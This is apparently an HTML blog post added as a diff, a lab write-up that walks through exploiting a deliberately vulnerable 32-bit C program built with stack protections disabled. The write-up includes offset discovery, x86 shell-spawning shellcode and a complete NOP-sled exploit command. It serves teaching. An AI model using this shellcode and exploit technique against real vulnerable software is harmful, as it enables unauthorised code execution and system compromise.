@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" type="image/png" href="http://localhost:1313/favicon.ico" />
+<meta property="og:url" content="http://localhost:1313/posts/bufferoverflow101/">
+  <meta property="og:site_name" content="Intel_Decrypted">
+  <meta property="og:title" content="Buffer Overflow 101">
+  <meta property="og:description" content="Here is a demo of all shortcodes available in Hugo.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-26T00:00:00+00:00">
+    <meta property="article:tag" content="Buffer Overflow">
+    <meta property="article:tag" content="Exploit Development">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Vulnerability">
+
+<title>Intel_Decrypted | Buffer Overflow 101</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+  
+      <link rel="stylesheet" href="/css/palette/catpuccin.css">
+
+      <script src="/js/main.js"></script>
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+
+</head>
+
+  
+<body
+    class="dark"
+>
+  
+  <main>
+    
+  <div class="container pt-5">
+    <div class="row mt-5 pt-5">
+      
+  <nav aria-label="breadcrumb" class="small">
+    <ol class="breadcrumb fw-bold">
+    <li class="breadcrumb-item">
+      <a href="/"
+        
+      >about</a>
+      
+    </li>
+    <li class="breadcrumb-item">
+      <a href="/posts"
+        class="text-decoration-underline link-offset-3"
+        
+      >posts</a>
+      
+    </li>
+    <li class="breadcrumb-item">
+      <a href="https://github.com/Cioraz"
+        
+          target="_blank" rel="noopener noreferrer"
+        
+      >github</a>
+      
+    </li>
+    </ol>
+  </nav>
+
+    </div>
+    
+    <div class="d-none d-lg-block position-fixed end-0 small toc">
+      <p class="toc-title">
+        Table of Contents:
+      </p>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#c-program-used-for-the-simulation">C Program used for the Simulation</a></li>
+    <li><a href="#compilation">Compilation</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#performing-the-attack">Performing the attack</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="post">
+      <header class="mb-4">
+        <h1 class="text-uppercase">Buffer Overflow 101</h1>
+        
+        
+        <div aria-label="breadcrumb">
+          <ol class="breadcrumb">
+            <li class="breadcrumb-item small">
+              <time datetime="2025-03-26T00:00:00&#43;00:00">March 26, 2025</time>
+            </li>
+            <li class="breadcrumb-item small">
+              5 minutes
+            </li>
+          </ol>
+        </div>
+      </header>
+      <article>
+        <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    mediumZoom('article img'); // Targets all images inside articles
+  });
+</script>
+<style>
+.toc {
+  font-size: 0.9em; /* Reduce the font size */
+  width: auto; /* Keep the width dynamic */
+  padding: 8px; /* Add some padding for spacing */
+  position: relative; /* Ensure it stays in its original position */
+  margin-left: 0; /* Keep it aligned to the left */
+}
+
+.toc a {
+  font-size: 0.85em; /* Reduce the font size of links */
+  line-height: 1.4; /* Adjust line height for better readability */
+}
+</style>
+<h2 id="background">Background</h2>
+<ul>
+<li>A bit of background on buffer overflows: Buffer overflows occur when a program attempts to write more data into a buffer than it has allocated for it. This can lead to overwriting adjacent memory locations, potentially resulting in code execution or other security vulnerabilities.</li>
+<li>Recently, in one of my lectures, I was tasked with simulating a buffer overflow vulnerability, and I would like to share my approach to simulating this vulnerability.</li>
+</ul>
+<h2 id="c-program-used-for-the-simulation">C Program used for the Simulation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>argv[]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">256</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">strcpy</span>(buffer, argv[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>The above binary is vulnerable because of the use of <code>strcpy</code>, which fails to check for buffer overflow. Since <code>strcpy</code> copies data without ensuring the destination buffer has enough space, an attacker can exploit this to overwrite adjacent memory. PS: for such applications always use <code>strncpy</code>.</li>
+</ul>
+<h2 id="compilation">Compilation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gcc <span style="color:#ff79c6">-</span>fno<span style="color:#ff79c6">-</span>stack<span style="color:#ff79c6">-</span>protector <span style="color:#ff79c6">-</span>z execstack <span style="color:#ff79c6">-</span>no<span style="color:#ff79c6">-</span>pie <span style="color:#ff79c6">-</span>m32 <span style="color:#ff79c6">-</span>mpreferred<span style="color:#ff79c6">-</span>stack<span style="color:#ff79c6">-</span>boundary<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span> program.c <span style="color:#ff79c6">-</span>o program
+</span></span></code></pre></div><ul>
+<li><u><em><strong>mpreferred-stack-boundary</strong></em></u>: This is particularly relevant for older or specific ABI requirements, as many modern systems use a higher boundary. Basically in my case, I had to use this to ensure that the stack is aligned to 4 bytes as im compiling to a 32 bit binary.</li>
+<li><u><em><strong>fno-stack-protector</strong></em>:</u> Disables stack protection also known as canaries allowing buffer overflow to occur.</li>
+<li><u><em><strong>execstack</strong></em>:</u> This flag marks the stack as executable, allowing you to place and run code from the stack.</li>
+<li><u><em><strong>no-pie</strong></em>:</u> Disabling PIE (Position Independent Executable) means the binary loads at a fixed address, which simplifies things for certain testing scenarios (like predictable addresses for shellcode).</li>
+<li><u><em><strong>m32</strong></em></u>: This flag compiles your code as a 32-bit binary.</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p><img src="/images/Screenshot_2025-03-26_10-47-14.png" alt="Checksec Image"></p>
+<ul>
+<li><u><em><strong>PIE</strong></em></u>: No PIE, meaning that the binary is not built as a Position Independent Executable, which results in a fixed memory layout each time the program runs.</li>
+<li><u><em><strong>Stack</strong></em></u>: No Canary found meaning we can easily perform buffer overflow as there are no protections also it is executable allowing for shellcode to be executed.</li>
+</ul>
+<h2 id="performing-the-attack">Performing the attack</h2>
+<ol>
+<li>
+<p><u><strong>Basic Exploration</strong></u><br>
+First, I&rsquo;ll disassemble the <code>main</code> function and fill the buffer to find out where the buffer&rsquo;s address is stored in the stack.</p>
+<p><img src="/images/Screenshot_2025-03-20_08-04-13.png" alt="Buffer Address"></p>
+<p>Now from the above we will first try to put a breakpoint at something after the <strong>puts@plt</strong> which is at <code>0x8049050</code> so that we can see how the buffer fills upon filling with input.</p>
+</li>
+<li>
+<p><u><strong>Filling the Buffer</strong></u></p>
+<p><img src="/images/Screenshot_2025-03-21_00-37-48.png" alt="Filling Buffer"></p>
+<p>Command: <code>r $(python2 -c 'print &quot;A&quot;*256')</code></p>
+<p>In the above image upon running this we can fill the buffer which can accommodate <code>256</code> bytes of characters using python2. By doing so we can find out whats the starting address of the buffer which will be used to craft the exploit.</p>
+<p>Running the below command gives us a better clarity,</p>
+<p>Command: <code>x/256x $esp</code></p>
+<p><img src="/images/Screenshot_2025-03-21_00-38-01.png" alt="Inspecting Buffer"></p>
+<p>From this image we can see that the buffer starts filling from <code>0xffffcfa4</code> with ‘A’ (0x41)</p>
+</li>
+<li>
+<p><u><strong>Offset Calculation</strong></u></p>
+<p>Now lets find till where we must give input so that we can overwrite the EIP (current instruction register) . From the below we see that we overwrote the EIP with <code>‘qaac’</code>.</p>
+<p>Command: <code>cyclic 300</code></p>
+<p><img src="/images/Screenshot_2025-03-21_00-39-34.png" alt="Cyclic 300"></p>
+<p>Now finding the offset using the below command,</p>
+<p>Command: <code>cyclic -l qaac</code></p>
+<p><img src="/images/Screenshot_2025-03-21_00-39-51.png" alt="Cyclic finder"></p>
+<p>Thus we found that the offset needed is <code>264</code> after which the next 4 bytes given will overwrite the EIP with that value.</p>
+<p>Command: <code>r $(python2 -c 'print &quot;A&quot;*264 + &quot;BBBB&quot;')</code></p>
+<p>We can confirm this with the below image where after <code>264</code>, I have given <code>‘BBBB’</code> as input which has been overwritten onto the EIP.</p>
+<p><img src="/images/Screenshot_2025-03-21_00-43-47.png" alt="EIP overwrite"></p>
+</li>
+<li>
+<p><u><strong>Writing the Exploit</strong></u></p>
+<p>Now we have the following details:</p>
+<p><strong>Buffer starting address</strong>: <code>0xffffcfa4</code><br>
+<strong>Offset</strong>: <code>264</code></p>
+<p>Next, we need malicious code. I’ll be using a shellcode that spawns a shell from the binary, which can be exploited by an attacker to compromise the system.</p>
+<p><strong>Shellcode used</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f1fa8c">\x</span>31<span style="color:#f1fa8c">\x</span>c0<span style="color:#f1fa8c">\x</span>50<span style="color:#f1fa8c">\x</span>68<span style="color:#f1fa8c">\x</span>2f<span style="color:#f1fa8c">\x</span>2f<span style="color:#f1fa8c">\x</span>73<span style="color:#f1fa8c">\x</span>68<span style="color:#f1fa8c">\x</span>68<span style="color:#f1fa8c">\x</span>2f<span style="color:#f1fa8c">\x</span>62<span style="color:#f1fa8c">\x</span>69<span style="color:#f1fa8c">\x</span>6e<span style="color:#f1fa8c">\x</span>89<span style="color:#f1fa8c">\x</span>e3<span style="color:#f1fa8c">\x</span>31<span style="color:#f1fa8c">\x</span>c9<span style="color:#f1fa8c">\x</span>31<span style="color:#f1fa8c">\x</span>d2<span style="color:#f1fa8c">\x</span>b0<span style="color:#f1fa8c">\x</span>0b<span style="color:#f1fa8c">\x</span>cd<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">80</span>
+</span></span></code></pre></div><p>The above is a 23 byte shell code</p>
+<p>So now to write the exploit we need to follow the below structure,</p>
+<ul>
+<li>First we need a <strong>NOP</strong> (NO operation sled) which provides a safe landing zone for the return address. Basically making sure that execution slides down NOPs to reach the shellcode . For this lets take a value of <code>100</code> NOPs (experimentally found).</li>
+<li>Next we put the 23 byte shell code.</li>
+<li>Next since the offset was 264 we fill the remaining (264 – 23 – 100 = <code>141</code>) with padding, so here Ive padded with ‘A’</li>
+<li>Next we write the address which we want to overwrite on the EIP</li>
+<li>In this the actual return stack address is <code>0xffffcfa4</code>, however we want to point it to an address which is somewhere within the NOP sled so it can slide to the shellcode. Hence from the below image ill take the address <code>0xffffd0c0</code> which is filled with /x90 which are NOPs so that it can slide execution into the shellcode.<br><br></li>
+</ul>
+<p>The stack address is located higher in memory, as shown below:</p>
+<p><img src="/images/Screenshot_2025-03-21_17-21-21.png" alt="Image with NOP slide"></p>
+<p>Thus, we can craft the exploit as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./program <span style="color:#ff79c6">$(</span>python3 -c <span style="color:#f1fa8c">&#39;import sys; sys.stdout.buffer.write(b&#34;\x90&#34;*100 + b&#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80&#34; + b&#34;A&#34;*141 + b&#34;\xc0\xd0\xff\xff&#34;)&#39;</span><span style="color:#ff79c6">)</span>
+</span></span></code></pre></div><ul>
+<li>The address <code>0xffffd0c0</code> has been written in little endian hence <code>\xc0\xd0\xff\xff</code>.</li>
+<li>NOP in hex is <code>\x90</code>.<br><br>
+Below is an image which shows the attack being successful and spawing a shell which can be used by the attacker for manipulating the system.<br><br></li>
+</ul>
+<p><img src="/images/Screenshot_2025-03-21_17-25-56.png" alt="Attacked"></p>
+<p>BOOM! We have successfully exploited the buffer overflow vulnerability and spawned a shell.</p>
+</li>
+</ol>
+
+      </article>
+      
+  <div class="tags pb-4 pt-2">
+    
+    
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/buffer-overflow/">Buffer Overflow</a>
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/exploit-development/">Exploit Development</a>
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/security/">Security</a>
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/vulnerability/">Vulnerability</a>
+  </div>
+
+      <div class="row">
+    <div class="col-md">
+        
+    </div>
+    <div class="col-md text-md-end">
+        
+    </div>
+</div>
+    </div>
+  </div>
+  <footer>
+    <div class="container mt-4 pb-1">
+    <p class="small opacity-75">
+        
+        
+        // powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/imgios/not-much">imgios/not-much</a>
+        
+    </p>
+</div>
+
+  </footer>
+
+  </main>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+</body>
+</html>
